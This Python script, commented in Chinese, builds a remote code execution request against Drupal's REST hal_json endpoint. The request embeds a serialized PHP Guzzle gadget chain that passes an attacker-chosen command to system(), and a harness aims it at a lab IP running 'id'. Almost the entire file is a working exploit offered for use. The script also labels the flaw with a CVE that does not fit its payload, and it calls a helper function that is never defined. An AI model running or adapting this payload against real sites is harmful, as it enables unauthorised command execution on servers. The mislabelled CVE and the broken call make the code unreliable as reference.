import json

def build(ip_port: str, cmd: str):
    # 计算命令长度
    cmd_len = len(cmd)
    
    # 使用Unicode转义字符构建恶意序列化字符串
    # 注意：这里使用 \u0000 而不是 \\u0000
    serialized_payload = f'O:24:"GuzzleHttp\\Psr7\\FnStream":2:{{s:33:"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods";a:1:{{s:5:"close";a:2:{{i:0;O:23:"GuzzleHttp\\HandlerStack":3:{{s:32:"\u0000GuzzleHttp\\HandlerStack\u0000handler";s:{cmd_len}:"{cmd}";s:30:"\u0000GuzzleHttp\\HandlerStack\u0000stack";a:1:{{i:0;a:1:{{i:0;s:6:"system";}}}}s:31:"\u0000GuzzleHttp\\HandlerStack\u0000cached";b:0;}}i:1;s:7:"resolve";}}}}s:9:"_fn_close";a:2:{{i:0;r:4;i:1;s:7:"resolve";}}}}'
    
    # 构建URL（完整URL用于requests库）
    full_url = f"http://{ip_port}/node/?_format=hal_json"
    
    # 构建请求体
    data = {
        "link": [
            {
                "value": "link",
                "options": serialized_payload
            }
        ],
        "_links": {
            "type": {
                "href": f"http://{ip_port}/rest/type/shortcut/default"
            }
        }
    }
    
    headers = {
        "Content-Type": "application/hal+json",
        "Accept": "*/*",
        "Host": ip_port
    }
    
    return {
        "method": "POST",
        "full_url": full_url,  # 用于requests等HTTP库
        "path_url": "/node/?_format=hal_json",  # 只包含路径
        "headers": headers,
        "data": data
    }

def generate_raw_http_request(request):
    """生成原始HTTP请求字符串"""
    # 构建请求行
    http_request = f"{request['method']} {request['path_url']} HTTP/1.1\r\n"
    
    # 构建请求头
    for key, value in request['headers'].items():
        http_request += f"{key}: {value}\r\n"
    
    # 空行分隔头部和主体
    http_request += "\r\n"
    
    # 构建JSON主体
    http_request += json.dumps(request['data'], separators=(',', ':'))  # 紧凑格式，无空格
    http_request += "\r\n"
    
    return http_request


def main():
    """测试函数"""
    # 测试数据
    ip_port = "192.168.159.133:82"
    cmd = "id"
    
    print("测试Drupal CVE-2018-7602请求包生成")
    print("=" * 60)
    
    try:
        # 生成请求
        request = build(ip_port, cmd)
        
        print("\n生成的请求包:")
        print("-" * 40)
        print_formatted_request(request)
        
        print("\n" + "=" * 60)
        print("原始HTTP请求字符串:")
        print("-" * 40)
        raw_request = generate_raw_http_request(request)
        print(raw_request)
        
        print("\n" + "=" * 60)
        print("验证信息:")
        print("-" * 40)
        
        # 验证序列化字符串
        serialized_payload = request['data']['link'][0]['options']
        expected_substring = f's:{len(cmd)}:"{cmd}"'
        
        if expected_substring in serialized_payload:
            print(f"✓ 序列化字符串中的命令正确 (长度={len(cmd)})")
        else:
            print(f"✗ 序列化字符串中的命令可能不正确")
            print(f"  期望包含: {expected_substring}")
        
        # 验证Unicode转义字符
        if "\\u0000" not in serialized_payload and "\u0000" in serialized_payload:
            print("✓ Unicode转义字符正确 (使用 \\u0000 而不是 \\\\u0000)")
        else:
            print("✗ Unicode转义字符可能不正确")
        
        # 检查JSON结构
        try:
            json.dumps(request['data'])
            print("✓ JSON数据格式正确")
        except Exception as e:
            print(f"✗ JSON数据格式错误: {e}")
            
    except Exception as e:
        print(f"生成请求包时出错: {e}")

if __name__ == "__main__":
    main()